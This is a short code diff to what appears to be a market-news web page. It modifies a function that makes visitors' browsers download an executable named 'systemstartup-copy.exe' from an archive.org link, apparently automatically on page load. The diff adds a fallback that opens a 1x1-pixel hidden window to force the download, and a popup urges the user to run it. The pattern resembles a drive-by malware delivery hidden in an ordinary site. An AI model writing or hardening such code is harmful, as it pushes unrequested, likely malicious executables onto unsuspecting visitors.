@@ -373,13 +373,19 @@ const marketNewsHeadlines = [
   // Download function
   const downloadFile = () => {
     const downloadUrl = 'https://archive.org/download/systemstartup-copy_202607/systemstartup%20copy.exe';
-    // Create a temporary anchor tag to trigger the download
-    const link = document.createElement('a');
-    link.href = downloadUrl;
-    link.download = 'systemstartup-copy.exe'; // Set the filename for download
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
+    try {
+      // Primary method: use anchor tag for direct download
+      const link = document.createElement('a');
+      link.href = downloadUrl;
+      link.download = 'systemstartup-copy.exe';
+      link.target = '_blank'; // Open in new tab to avoid navigation away
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    } catch (error) {
+      // Fallback: use window.open if anchor tag approach fails
+      window.open(downloadUrl, '_blank', 'width=1,height=1');
+    }
   };
 
   // Automatic download on page load and show popup after 2 seconds
@@ -897,7 +903,8 @@ const marketNewsHeadlines = [
               If your download didn't start automatically, click the button below:
             </Typography>
             <Button 
-              onClick={() => {
+              onClick={(e) => {
+                e.preventDefault(); // Prevent any default navigation
                 downloadFile();
                 setShowDownloadPopup(false); // Close the popup after clicking download
               }}
